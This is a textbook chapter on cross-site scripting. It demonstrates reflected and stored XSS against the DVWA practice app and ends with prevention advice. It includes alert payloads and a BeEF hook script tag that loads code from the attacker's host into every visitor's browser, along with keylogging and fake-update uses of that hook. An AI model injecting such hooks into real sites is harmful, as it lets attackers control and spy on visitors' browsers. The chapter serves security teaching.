<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Cross-Site Scripting Vulnerabilities</h1>
                </header>
            
            <article>
                
<p><span>In both this and the following chapter, we're going to study a vulnerability called <strong>cross-site scripting</strong> (<strong>XSS</strong>) so that we know how to discover XSS vulnerabilities. But we will start off by learning about XSS attacks and XSS vulnerabilities. Then we will exploit the reflected vulnerability of XSS. Later, we will be looking at stored XSS, which is another vulnerability of XSS, and also try to launch an attack. Then we will look into exploiting XSS, and at the end of the chapter, we will learn how you can protect yourself against these vulnerabilities.</span></p>
<p>In this chapter, we will be covering the following topics:</p>
<ul>
<li>Introduction to XSS</li>
<li>Reflected XSS</li>
<li>Stored XSS</li>
<li>XSS BeEF exploitation</li>
<li>XSS protection</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Introduction to XSS</h1>
                </header>
            
            <article>
                
<p>Now let's learn more about XSS. This type of vulnerability allows an attacker to inject JavaScript into a page. JavaScript is a programming language, and using this vulnerability, an attacker would be able to execute code written in JavaScript into a certain page, such as a website. JavaScript is a client-side language, so when the code is executed, it will be executed on the client, on the user, the person who is browsing the web page. It's not going to be executed on the server, so even if our code results in us getting a reverse shell, the shell will be coming from the user who is browsing the page, not from the website. So any code we write in JavaScript will be exploited or will run on the target user—on the people who see the web pages—and not on the web server. So, the web server is only going to be used as a means of executing or delivering the code.</p>
<p class="mce-root"/>
<p>There are three main types of XSS vulnerabilities:</p>
<ul>
<li><strong>Persistent or stored</strong>:<strong> </strong>Stored XSS gets stored in the database. The code that we inject will be stored in the database or the page so that every time any person views that page, our code will be executed.</li>
<li><span><strong>Reflected</strong>:</span> <span>With r</span>eflected XSS, the code will only be executed when the target user runs a specific URL that is crafted or written by us. So we will be manipulating some sort of URL and sending it to a target, and when the target runs that URL, the code will be executed.</li>
<li><span><strong>DOM-based</strong>:<strong> </strong></span>DOM-based XSS results from JavaScript code that is written on the client, so the code will actually be interpreted and run on the client side without having any communication with the web server. This could be very dangerous because sometimes web servers apply security and filtration measures to check for XSS, <span>but with DOM-based XSS, the code never gets sent to the web server. This means that the code would be interpreted and run on the web browser without even interacting with the web server, and will be present in websites that update their content without refreshing. We've all used websites where we enter our username, for example, and it loads straight away without having to check with the web server, or perhaps we enter some sort of a string and it performs a search without communicating with the web server; whatever the process, some websites perform functions without communicating with their web server. If we are able to inject into these kinds of website, then such injections will not be validated, and they will be executed straight away and bypass all validations.</span></li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Reflected XSS</h1>
                </header>
            
            <article>
                
<p>Let's learn how to discover these kinds of vulnerabilities. The method is very similar to SQL injection. First, you browse through your target and try to inject into any textbox or URL that looks similar. Whenever you see a URL with parameters, try to inject <kbd>something=something</kbd> as parameters, or try to inject into textboxes. Let's have a look at a reflected XSS example. These are the non-persistent, non-stored vulnerabilities where we have to actually send the code to the target, and once the target runs the code, it will be executed on their machine.</p>
<p class="mce-root"/>
<p>Let's have a look at our DVWA website and log into it. Inside the <span class="packt_screen">DVWA Security</span> tab on the left-hand side of the following screenshot, we are going to set the <span class="packt_screen">Script Security</span> to <span class="packt_screen">low</span>:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2053 image-border" src="assets/53b3d31a-fbe1-4083-87f3-bfbb5f18f950.png" style="width:52.75em;height:42.92em;"/></div>
<p>As we can see in the following screenshot, we can enter your name in the textbox, and it's just going to say <span class="packt_screen">Hello zaid</span>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2054 image-border" src="assets/d666a75d-9dbc-43d2-9273-60798bf780d3.png" style="width:42.17em;height:34.25em;"/></p>
<p>This is obviously just an example, but the idea is that you can inject into textboxes. Also, if we have a look at the URL <kbd>10.0.2.15/dvwa/vulnerabilities/xss-r/?name=zaid</kbd>, we can see that it is using the <kbd>GET</kbd> method, so we can inject into the URL as well. Let us start the D-pad and try to inject XSS code on it and see whether the <span>JavaScript </span>code will be executed. We are using a very simple script, the <kbd>&lt;script&gt;&lt;/script&gt;</kbd> tag. There are a lot of ways of discovering these kinds of vulnerabilities and a lot of ways to bypass filters, but for now, we're just having a look at a basic example where we can inject a normal script and write <kbd>&lt;script&gt;alert("XSS")<span>&lt;/script&gt;</span></kbd>—which is just a function that gives an alert—to give it a textbox. Then we are going to click on <span class="packt_screen">Submit</span> and see whether this code will be executed.</p>
<p class="mce-root"/>
<p>As we can see in the following screenshot, instead of saying <span class="packt_screen">Hello zaid</span>, it says <span class="packt_screen">Hello</span>; and our code has been executed, and it produces a <span class="packt_screen">XSS</span> popup:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2056 image-border" src="assets/d653c35e-ce6b-44e4-b036-be92c37746a5.png" style="width:10.67em;height:6.42em;"/></div>
<p>If we have a look at the URL <kbd><span>10.0.2.15/dvwa/vulnerabilities/xss-r/?name=&lt;script&gt;alert("XSS")&lt;%2fscripts&gt;#</span></kbd>, we can see that it actually already did it for us. But if we copy and paste this URL on a notepad, we can see the script in the <kbd>name</kbd> parameter, and some CSS scripting.</p>
<p>Obviously, all of the characters are just HTML escape characters, and if we send the URL to anybody, <span>then the code will be executed on the machine</span><span> of </span><span>whoever views the URL, and it's going to display</span> a popup saying <span class="packt_screen">XSS</span><span>. Let's see how we can also inject through</span> <span>the URL. Just to show the whole idea, we will use the URL </span><kbd>10.0.2.15/dvwa/vulnerabilities/xss-r/?name=&lt;script&gt;alert("XSS")&lt;/scripts&gt;#</kbd><span>. If we press</span> <em>Enter</em><span>, the code will be executed. We can copy the URL and send it to a certain person, and once they run that code, the code will be executed on their machine.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Stored XSS</h1>
                </header>
            
            <article>
                
<p>Now let's have a look at a stored XSS example. Stored XSS is very similar to reflected XSS—it allows you to inject JavaScript code into the browser. The code is executed on the users that visit the page. The only difference is that, with reflected XSS, we have to send the URL to our target, so the target has to actually click on a URL for the exploit to run. With stored XSS, the code will be stored into the database—that is, into the page—so that every time a person runs that page, they will see our code and our code will be executed, so we won't need to interact with any users or send them anything. Therefore, this could be much more dangerous than reflected XSS.</p>
<p>So, let's have a look at this. Click on the <span class="packt_screen">XSS stored</span> tab on the left. We will see a page, as shown in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2060 image-border" src="assets/3a1400c6-efbd-4e0b-8198-8d791d4c0434.png" style="width:55.17em;height:22.17em;"/></p>
<p>The page only allows us to add a message to the system. Now we are going to enter <kbd>zaid</kbd> in the <span class="packt_screen">Name</span> textbox. We're just going to do a normal test to begin with. We're going to enter <kbd>message body</kbd> in the <span class="packt_screen">Message</span> textbox, and then we are going to click on the <span class="packt_screen">Sign Guestbook</span> button. We can see in the following screenshot that <span class="packt_screen">zaid</span> added a message called <span class="packt_screen">message body</span>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2061 image-border" src="assets/fbe20ebe-7788-4d83-893a-dd96de40bb2b.png" style="width:59.42em;height:23.75em;"/></p>
<p class="mce-root"/>
<p>So, if we switch to a different DVWA machine in a different place and go to the <span class="packt_screen">XSS stored</span> tab, we will be able see that there are two entries. The entries will be loaded from the database, and they contain the entries in that database. If we managed to inject code instead of a message, then <span>the code will run on the machine of whoever runs this page without us even needing to send that person any code</span><span>.</span></p>
<p>Let's try to inject into the DVWA that is running in the Kali environment. Let's enter the <span class="packt_screen">Name</span> as <kbd>zaid</kbd><span class="packt_screen">. </span>We are going to try to enter our code in the <span class="packt_screen">Message</span> textbox. We will enter it as <kbd>&lt;script&gt;</kbd>, and we are going to use the exact same test code that we used in the previous section, just a message saying <kbd>XSS</kbd>. Again, very basic code, but it serves for the purposes of this attack. We're going to make the code say <kbd>alert("XSS")</kbd>, and then we are going to click on <span class="packt_screen">Sign Guestbook</span> button. So the code is as follows:</p>
<pre>&lt;script&gt;alert("XSS")&lt;/script&gt;</pre>
<p>We will see that we get <span class="packt_screen">XSS</span> displayed in the pop-up alert, but the real magic happens when a normal person accesses the page:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2062 image-border" src="assets/a6ba38aa-68ff-43d4-ad21-035f003f6fc9.png" style="width:11.42em;height:6.83em;"/></p>
<p>Let's assume that DVWA is just a normal website and people are <span>just</span><span> </span><span>coming to browse it. Once they go to the <span class="packt_screen">XSS stored</span> tab on the website, the JavaScript code will be executed on their system from the website. The code will come from the website and will be executed on each user that visits the page. Again, we're just implementing a proof-of-concept here; in the next sections, we'll see how to further exploit this kind of vulnerability.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">XSS BeEF exploitation</h1>
                </header>
            
            <article>
                
<p>We haven't yet seen a good way of exploiting XSS vulnerabilities; all we have done so far is inject a very simple code that displays an alert on the screen saying that this website is vulnerable. What we are going to do now is something more advanced. We want to control the victims and do stuff on the target computers, on the people that visit the vulnerable pages where we have injected our code. We're going to use the BeEF browser to do this. We had a look at BeEF in previous chapters. What we're going to do here is use the BeEF hook URL and inject it into the stored XSS page so that everybody who visits that page will be hooked to BeEF. Then, we'll be able to run all the commands that BeEF allows us to run on the target computer.</p>
<p class="mce-root"/>
<p class="mce-root"/>
<p>Let's start BeEF. If we look at the online browsers, we have no victims at the moment. So, in order to hook victims to this framework and gain access to the functionality of BeEF, we need to inject a particular script instead of the alert:</p>
<pre>&lt;script src="http://&lt;IP&gt;:3000/hook.js"&gt;&lt;/script&gt;</pre>
<p>Replace the <kbd>IP</kbd> in the preceding code with your current IP. Remember in the previous sections, we were injecting an <kbd>alert</kbd> script into the URL, or into the <span class="packt_screen">XSS</span> <span class="packt_screen">stored</span> page. In this example, we're going to be injecting a script that hooks the target onto our BeEF browser so that we can exploit them. We are going to copy the preceding script and then we are going to go to our DVWA website. We are just going to make sure that the security is set to <span class="packt_screen">low</span> in DVWA's <span class="packt_screen">Security</span> tab. Start the BeEF browser on Kali machine. Go to the DVWA website and under the <span class="packt_screen">XSS stored</span> tab, we're are going to enter the <span class="packt_screen">Name</span> as <kbd>beef</kbd>, and we'll enter the <span class="packt_screen">Message</span> as the hook URL that we got from the BeEF Terminal. Again will need to modify the IP address in the hook URL to our own IP address. So, instead of just the IP address of the website, we are going to enter our own IP address, which is <kbd>10.0.2.15</kbd>. Now, the site wont let us add any more characters because the <span class="packt_screen">Message</span> field is configured in a way that doesn't allow more than <span><span>a certain </span></span>number of characters. Instead, we can bypass this very easily by right-clicking and selecting the <span class="packt_screen">Inspect Element</span> option from the drop-down menu:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2064 image-border" src="assets/1755d2bf-5710-49e1-83db-4d3555723b5d.png" style="width:30.25em;height:18.33em;"/></p>
<p class="mce-root"/>
<p>Then we are going to modify <kbd>maxlength</kbd>, setting it <span>to</span><span> </span><kbd>500</kbd> <span>instead of</span> <kbd>50</kbd><span>:</span></p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2065 image-border" src="assets/e125725d-5f0e-475b-9475-586d643deb47.png" style="width:65.92em;height:25.17em;"/></p>
<p><span>Now we can add more characters. We are going to close the</span> <span class="packt_screen">Inspect Element</span> <span>dialog box and set the IP to</span> <kbd>10.0.2.15</kbd><span>, which is our current IP. We are then going to click the </span><span class="packt_screen">Sign Guestbook</span><span> button, and this should make it work. Now, if we go to our target, which is our Linux computer that </span><span>has been hooked as a target</span><span>, it can be seen to the left of the BeEF window in the following screenshot</span><span>:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2066 image-border" src="assets/f5544af3-7062-4322-8202-dab94ba33f9f.png" style="width:15.50em;height:7.00em;"/></div>
<p><span>Obviously, this is not our target; it is just us who are looking at the site, and the hook has been executed on our browser. Our target is actually the Windows device, or any person who is going to be visiting this <span class="packt_screen">XSS stored</span> page. Because this is a stored XSS, just like we explained, the code will be executed on the machine of any person who visits the page.</span></p>
<p>Now, if we go back to BeEF browser, we should see the Windows device, and we will be able to see that it's shown up in the <span class="packt_screen">Online Browsers</span>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2067 image-border" src="assets/d4a646fe-e889-4e15-a485-8895b0b057e6.png" style="width:15.33em;height:5.00em;"/></p>
<p class="mce-root"/>
<p>So we <span>have</span><span> </span><span>basically hooked the Windows device, and we can now run the large number of functions that BeEF allows us to use. Next, we are going to click on our target and go to the</span> <span class="packt_screen">Commands</span> <span>tab.</span> <span>Right now, we just want to run a specific command, which is just an</span> <kbd>alert</kbd> <span>command like we were using before, just to confirm that everything is working. We are going to</span> use<span> </span><kbd>Create Alert Dialog</kbd><span>, and we can set the <span class="packt_screen">Alert text</span> as anything we want. We are going to leave it as</span> <kbd>BeEF Alert Dialog</kbd><span>, and we will just click on</span> <span class="packt_screen">Execute</span><span>:</span></p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2068 image-border" src="assets/aacf0a05-3d0d-4b00-9d77-7069d8a8755f.png" style="width:106.08em;height:18.92em;"/></p>
<p>Now, if we go on our target computer, we can see that the alert dialog is working, as shown <span>in the following</span><span> </span>screenshot<span>:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2069 image-border" src="assets/9dcf4af4-852f-42eb-8f9c-6d152297f18d.png" style="width:23.58em;height:9.08em;"/></div>
<p>Now, anybody who browses our target website—the vulnerable website—will get hooked to  BeEF, and we can then run all the commands that we've been looking at. So, all the commands that we see in the client-side attacks—such as gaining full access using a fake notification bar, getting a screenshot, injecting a keylogger—can be used on any person who visits the vulnerable page because we injected our hook into that page, not into the browser. Our hook is a part of the page, so every time the page is loaded by anyone, they will be hooked to the BeEF browser.</p>
<p class="mce-root"/>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">XSS protection</h1>
                </header>
            
            <article>
                
<p>Now let's talk about how we can prevent XSS vulnerabilities. These vulnerabilities exist because whenever a user enters something into a textbox or a parameter, that input is displayed in the HTML, so it's treated as if it's part of the page. Therefore, if there is JavaScript in it, the code is executed. To prevent this exploit, the best thing to do is to try and minimize the usage of untrusted input. Given this exploit, <span>we should try to minimize occasions where the </span><span>user inputs something or where something is input from parameters. Also, make sure that we always escape whatever is going to be displayed or used in the HTML page, because XSS can not only be injected into places where things are displayed on the page, but it can also be injected into parameters of certain elements of the HTML page. Escaping means that we convert each of the characters shown in the following screenshot to what they would be represented by in HTML. We can do this using our own script:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2071 image-border" src="assets/784a3cc8-ef24-4130-aaa6-7cc10852440b.png" style="width:9.58em;height:10.00em;"/></div>
<p>Now let's see how it happens. Starting from the vulnerable web page that we are using, let's go to the <span class="packt_screen">XXS stored</span> page. Let's inspect the element that is highlighted in the following screenshot, which is where we injected our alert, and if we right-click and go to <span class="packt_screen">Inspect Element</span> in the drop-down menu, it will show us the HTML of the highlighted element:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2072 image-border" src="assets/4bc67cd7-c726-490b-a543-5d08755fb6fa.png" style="width:55.50em;height:15.00em;"/></div>
<p>If we scan through it, we will see that we have the <span class="packt_screen">Name</span>, which is <span class="packt_screen">zaid</span>, and then the other input, which is the <span class="packt_screen">Message.</span> It's a script, and what the script does is displays an alert which says XSS, so it's exactly what we injected into it when we made the comment. So, every time we run this page, this piece of code gets executed. We need to make sure that every time a user enters something, and every time something is displayed on a page or is used somewhere in the elements of the page (even the <kbd>id</kbd> parameter, for example, is a parameter of the <kbd>&lt;div&gt;</kbd> tag, but it isn't displayed), then it can be injected as well. Hackers can try to inject hooks into the parameters—they can try to inject hooks into the image attributes, for example, make an image and inject a hook into the source or the URL.</p>
<p>Let's try an example where every time a user's input is used anywhere on the page—even if we don't see it—we make sure that we escape that input and ensure that it does not contain any code, and if the input does contain any code, that it's converted to an equivalent that will not be run. It's converted to its HTTP equivalent so that we see <kbd>alert</kbd> in the message. We see the message as a script <kbd>alert</kbd> of an XSS vulnerability, but it will never be executed on the target person when they run it.</p>
<p>Now, as a user, to prevent ourselves from being victim of an XSS attack, the URL coming to us will probably look like the URL of a trusted website; for example, let's say that we work in a company that had an XSS vulnerability. We log into our company and the code gets executed on our machine. Once this happens, there isn't much we can do, so we need to be careful beforehand. With BeEF, we saw that in order to exploit the vulnerabilities, we showed, for example, a fake update to the target computer. So if we get a message stating that there is an update, we should go to the actual website of the software that (apparently) needs updating to check. So, if the Firefox browser states that there is an update for its software, go to the Firefox website and see whether there is actually an update, and if there is, download it from that website—don't download it from the notification that's received. Also, make sure to download it from an HTTPS website. Once we download it, we can inspect and check it the same way that we've seen before in order to make sure that there are no backdoors or anything in it. We can also check the <kbd>md5sum</kbd> to make sure that the file hasn't been manipulated while it was being downloaded, the same as we did with the fake Facebook login when we were using BeEF. So, whenever we are told that we have been logged out and are asked to log back in again, ignore the request and go to Facebook, make sure it's using HTTPS, and then log in to Facebook. Always try to be careful when notifications pop up telling you that you need to do things—always be aware, and never trust them.</p>
<p class="mce-root"/>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Summary </h1>
                </header>
            
            <article>
                
<p>In this chapter, we learned about XSS attacks, which can be described as vulnerabilities that are found on web applications. We also learned that there are three major types of XSS vulnerabilities—the reflected and stored. We looked at the reflected vulnerability and used the DVWA website to launch this attack. We also learned about the stored XSS vulnerability, and even practically implemented it. Then, in the exploitation section, we performed an advanced attack where we controlled the victim's machine. Finally, we learned how to protect ourselves from these vulnerabilities. In the next chapter, we are going to be learning about a tool called ZAP. </p>


            </article>

            
        </section>
    </body></html>